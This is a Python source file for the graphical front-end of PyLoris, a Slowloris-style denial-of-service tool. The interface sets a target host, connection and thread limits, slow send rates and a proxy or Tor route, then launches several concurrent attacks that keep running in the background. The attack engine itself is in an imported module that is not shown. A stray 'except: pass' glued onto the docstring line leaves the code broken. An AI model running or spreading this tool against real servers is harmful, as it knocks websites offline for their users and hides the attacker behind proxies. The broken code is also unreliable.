#! /usr/bin/env python

"""
pyloris.py
This is the new face of PyLoris. Simply invoking this script will present
the flashy new Tkinter GUI. All connections options are on the left, while
the main request body is located in the text area on the right. Multiple
attack instances can be run simultaneously, with different connection
and request body parameters. One caveat is that PyLoris will continue to
silently run in the background unless the main window is closed or the "Stop
Attack" button is clicked.
"""except: pass 

from Tkinter import BooleanVar
from Tkinter import *
from Tkinter import Toplevel
import time

from libloris import *

class MainWindow(Tk):
    def __init__(self):
        Tk.__init__(self)
        self.title(string = ".o0O| PyLoris |O0o.")
        self.lws = []

        self.options = {
            'host' : StringVar(),
            'port' : IntVar(),
            'ssl' : BooleanVar(),
            'attacklimit' : IntVar(),
            'connectionlimit' : IntVar(),
            'threadlimit' : IntVar(),
            'connectionspeed' : DoubleVar(),
            'timebetweenthreads' : DoubleVar(),
            'timebetweenconnections' : DoubleVar(),
            'quitimmediately' : BooleanVar(),
            'socksversion' : StringVar(),
            'sockshost' : StringVar(),
            'socksport' : IntVar(),
            'socksuser' : StringVar(),
            'sockspass' : StringVar(),
            'request' : StringVar(),
        }

        self.options['host'].set('localhost')
        self.options['port'].set(80)
        self.options['ssl'].set(False)
        self.options['attacklimit'].set(500)
        self.options['connectionlimit'].set(500)
        self.options['threadlimit'].set(50)
        self.options['connectionspeed'].set(0.3)
        self.options['timebetweenthreads'].set(0.3)
        self.options['timebetweenconnections'].set(1)
        self.options['quitimmediately'].set(False)
        self.options['socksversion'].set('NONE')
        self.options['sockshost'].set('localhost')
        self.options['socksport'].set(9050)
        self.options['socksuser'].set('')
        self.options['sockspass'].set('')

        gf = LabelFrame(self, text = 'General', relief = GROOVE, labelanchor = 'nw', width = 400, height = 90)
        gf.grid(row = 0, column = 1)
        gf.grid_propagate(0)
        Label(gf, text = 'Host:').grid(row = 0, column = 1)
        Entry(gf, textvariable = self.options['host']).grid(row = 0, column = 2, columnspan = 2)
        Label(gf, text = 'Port:').grid(row = 1, column = 1)
        Entry(gf, textvariable = self.options['port']).grid(row = 1, column = 2, columnspan = 2)
        Checkbutton(gf, text = 'SSL', variable = self.options['ssl']).grid(row = 2, column = 1)

        bf = LabelFrame(self, text = 'Behavior', relief = GROOVE, labelanchor = 'nw', width = 400, height = 170)
        bf.grid(row = 1, column = 1)
        bf.grid_propagate(0)
        Label(bf, text = 'Attack Limit (0 = No limit):').grid(row = 0, column = 1)
        Entry(bf, textvariable = self.options['attacklimit']).grid(row = 0, column = 2)
        Label(bf, text = 'Connection Limit (0 = No limit):').grid(row = 1, column = 1)
        Entry(bf, textvariable = self.options['connectionlimit']).grid(row = 1, column = 2)
        Label(bf, text = 'Thread Limit (0 = No limit):').grid(row = 2, column = 1)
        Entry(bf, textvariable = self.options['threadlimit']).grid(row = 2, column = 2)
        Label(bf, text = 'Connection speed (bytes/sec):').grid(row = 3, column = 1)
        Entry(bf, textvariable = self.options['connectionspeed']).grid(row = 3, column = 2)
        Label(bf, text = 'Time between thread spawns (seconds):').grid(row = 4, column = 1)
        Entry(bf, textvariable = self.options['timebetweenthreads']).grid(row = 4, column = 2)
        Label(bf, text = 'Time between connections (seconds):').grid(row = 5, column = 1)
        Entry(bf, textvariable = self.options['timebetweenconnections']).grid(row = 5, column = 2)
        Checkbutton(bf, text = 'Close finished connections', variable = self.options['quitimmediately']).grid(row = 6, column = 1, columnspan = 2)

        pf = LabelFrame(self, text = 'Proxy', relief = GROOVE, labelanchor = 'nw', width = 400, height = 130)
        pf.grid(row = 2, column = 1)
        pf.grid_propagate(0)
        Label(pf, text = 'Proxy type (SOCKS4/SOCKS5/HTTP/NONE)').grid(row = 0, column = 1)
        Entry(pf, textvariable = self.options['socksversion']).grid(row = 0, column = 2)
        Label(pf, text = 'Proxy Hostname / IP Address').grid(row = 1, column = 1)
        Entry(pf, textvariable = self.options['sockshost']).grid(row = 1, column = 2)
        Label(pf, text = 'Proxy Port').grid(row = 2, column = 1)
        Entry(pf, textvariable = self.options['socksport']).grid(row = 2, column = 2)
        Label(pf, text = 'Proxy Username').grid(row = 3, column = 1)
        Entry(pf, textvariable = self.options['socksuser']).grid(row = 3, column = 2)
        Label(pf, text = 'Proxy Password').grid(row = 4, column = 1)
        Entry(pf, textvariable = self.options['sockspass']).grid(row = 4, column = 2)

        Button(self, text = "Launch", command = self.launch).grid(row = 3, column = 1)

        df = LabelFrame(self, text = 'Request Body', relief = GROOVE, labelanchor = 'nw')
        df.grid(row = 0, column = 2, rowspan = 4)
        self.options['request'] = Text(df, foreground="white", background="black", highlightcolor="white", highlightbackground="purple", wrap=NONE, height = 28, width = 80)
        self.options['request'].grid(row = 0, column = 1)
        self.options['request'].insert(END, 'GET / HTTP/1.1\r\nHost: www.example.com\r\nKeep-Alive: 300\r\nConnection: Keep-Alive\r\nReferer: http://www.demonstration.com/\r\n')
        self.options['request'].insert(END, 'User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.1.249.1045 Safari/532.5\r\n')
        self.options['request'].insert(END, 'Cookie: data1=' + ('A' * 100) + '&data2=' + ('A' * 100) + '&data3=' + ('A' * 100) + '\r\n')


    def launch(self):
        lorisoptions = DefaultOptions()
        for key in self.options.keys():
            if key == 'request': lorisoptions[key] = self.options[key].get('1.0', END)
            elif key == 'quitimmediately' or key == 'ssl':
                if self.options[key].get() == 0:
                    lorisoptions[key] = False
                else: lorisoptions[key] = self.options[key].get()
            else: lorisoptions[key] = self.options[key].get()

        self.lws.append(LorisWindow('%s:%i' % (lorisoptions['host'], lorisoptions['port']), lorisoptions))

    def checkloop(self):
        thread.start_new_thread(self.check, ())

    def check(self):
        while True:
            for lw in self.lws:
                lw.check()
            time.sleep(1)

class LorisWindow(Toplevel):
    def __init__(self, title, options):
        Toplevel.__init__(self)
        self.title(string = title)
        self.loris = Loris()
        self.loris.LoadOptions(options)
        self.elements = {'attacks' : StringVar(), 'threads' : StringVar(), 'sockets' : StringVar()}
        self.loris.start()

        sf = LabelFrame(self, text = 'Status', width = 180, height = 138)
        sf.grid(row = 0, column = 1)
        sf.grid_propagate(0)
        Label(sf, text = 'Target: %s:%i' % (options['host'], options['port'])).grid(row = 0, column = 1)
        Label(sf, text = 'Attacks: 0', textvar = self.elements['attacks']).grid(row = 1, column = 1)
        Label(sf, text = 'Threads: 0', textvar = self.elements['threads']).grid(row = 2, column = 1)
        Label(sf, text = 'Sockets: 0', textvar = self.elements['sockets']).grid(row = 3, column = 1)
        Button(sf, text = 'Stop Attack', command = self.loris.stop).grid(row = 4, column = 1)

        df = LabelFrame(self, text = 'Log')
        df.grid(row = 0, column = 2)
        self.elements['logs'] = Text(df, foreground="white", background="black", highlightcolor="white", highlightbackground="purple", wrap=WORD, height = 8, width = 80)
        self.elements['logs'].grid(row = 0, column = 1)

    def check(self):
        status = self.loris.status()
        self.elements['attacks'].set('Attacks: %i' % (status[0]))
        self.elements['threads'].set('Threads: %i' % (status[1]))
        self.elements['sockets'].set('Sockets: %i' % (status[2]))

        try:
            while True:
                message = self.loris.messages.get(False)
                self.elements['logs'].insert(END, '%s\n' % message)
                self.elements['logs'].yview_moveto(1.0)
        except:
            pass

        try:
            while True:
                debug = self.loris.debug.get(False)
                self.elements['logs'].insert(END, '%s\n' % debug)
                self.elements['logs'].yview_moveto(1.0)
        except:
            pass

        try:
            while True:
                error = self.loris.errors.get(False)
                self.elements['logs'].insert(END, '[ERROR]: %s\n' % error)
                self.elements['logs'].yview_moveto(1.0)
        except:
            pass

if __name__ == '__main__':
    try:
        mw = MainWindow()
        mw.checkloop()
        mw.mainloop()
    except Exception, ex:
        print('There was an error: %s.\nQuitting.' % ex)
